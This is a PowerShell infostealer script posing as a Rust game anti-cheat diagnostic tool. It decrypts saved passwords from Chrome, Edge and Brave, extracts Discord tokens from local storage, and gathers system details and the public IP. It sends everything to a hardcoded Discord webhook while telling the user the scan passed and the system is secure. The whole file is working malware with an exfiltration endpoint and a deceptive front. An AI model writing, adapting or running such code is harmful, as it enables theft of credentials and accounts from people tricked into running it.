# steam_token_harvester.ps1
# Disguised as "Rust Cheat Detection Diagnostic Tool v4.0"

Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Web

function Get-DecryptedData {
    param($encryptedData)
    try {
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedData, 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    } catch {
        return "Decryption failed"
    }
}

function Get-BrowserCredentials {
    $credentials = @()
    $browsers = @(
        @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
        @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
        @{ Name = "Brave"; Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" }
    )
    
    foreach ($browser in $browsers) {
        $loginDataPath = Join-Path $browser.Path "Default\Login Data"
        if (Test-Path $loginDataPath) {
            try {
                $tempCopy = Join-Path $env:TEMP "login_data_temp"
                Copy-Item $loginDataPath $tempCopy -Force
                
                $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
                $connection.ConnectionString = "Data Source=$tempCopy"
                $connection.Open()
                
                $command = $connection.CreateCommand()
                $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
                
                $reader = $command.ExecuteReader()
                while ($reader.Read()) {
                    $encryptedPassword = $reader["password_value"]
                    $password = if ($encryptedPassword.Length -gt 0) { 
                        Get-DecryptedData $encryptedPassword 
                    } else { 
                        "Empty" 
                    }
                    
                    $credentials += @{
                        Browser = $browser.Name
                        URL = $reader["origin_url"]
                        Username = $reader["username_value"]
                        Password = $password
                    }
                }
                $connection.Close()
                Remove-Item $tempCopy -Force
            } catch {
                # Silent continue
            }
        }
    }
    return $credentials
}

function Get-DiscordTokens {
    $tokens = @()
    $discordPaths = @(
        "$env:APPDATA\discord",
        "$env:LOCALAPPDATA\Discord"
    )
    
    foreach ($discordPath in $discordPaths) {
        $localStoragePath = Join-Path $discordPath "Local Storage\leveldb"
        if (Test-Path $localStoragePath) {
            try {
                $ldbFiles = Get-ChildItem $localStoragePath -Filter "*.ldb" | Select-Object -First 5
                foreach ($file in $ldbFiles) {
                    $content = Get-Content $file.FullName -Encoding Byte -ReadCount 0
                    $textContent = [System.Text.Encoding]::UTF8.GetString($content)
                    
                    if ($textContent -match "[\\\"](mfa\\.[a-zA-Z0-9_-]{84})[\\\"]") {
                        $tokens += $matches[1]
                    }
                    if ($textContent -match "[\\\"]([a-zA-Z0-9_-]{24}\\.[a-zA-Z0-9_-]{6}\\.[a-zA-Z0-9_-]{27})[\\\"]") {
                        $tokens += $matches[1]
                    }
                }
            } catch {
                # Silent continue
            }
        }
    }
    return $tokens | Select-Object -Unique
}

function Get-SystemInfo {
    return @{
        OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        Username = $env:USERNAME
        Computername = $env:COMPUTERNAME
        Date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        IP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue) || "Unknown"
    }
}

function Send-ToDiscord {
    param($message)
    $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
    try {
        $payload = @{ content = $message } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
    } catch {}
}

# Main execution
Write-Host "Starting enhanced Rust Anti-Cheat scan..." -ForegroundColor Yellow

$sysInfo = Get-SystemInfo
$creds = Get-BrowserCredentials
$discordTokens = Get-DiscordTokens

# Build report
$report = @"
**COMPREHENSIVE SECURITY SCAN v4.0**

**System Information:**
- OS: $($sysInfo.OS)
- User: $($sysInfo.Username)
- PC: $($sysInfo.Computername) 
- IP: $($sysInfo.IP)
- Scan Time: $($sysInfo.Date)

**Recovered Credentials:** $($creds.Count)
$($creds | ForEach-Object { 
    "`n- **$($_.Browser)**`n  URL: $($_.URL)`n  User: $($_.Username)`n  Pass: $($_.Password)"
} | Out-String)

**Discord Tokens Found:** $($discordTokens.Count)
$($discordTokens -join "`n")

**Scan Result:** System secure - no cheat artifacts detected
"@

Send-ToDiscord $report

Write-Host "Scan completed successfully!" -ForegroundColor Green
Write-Host "Security verification passed." -ForegroundColor Green
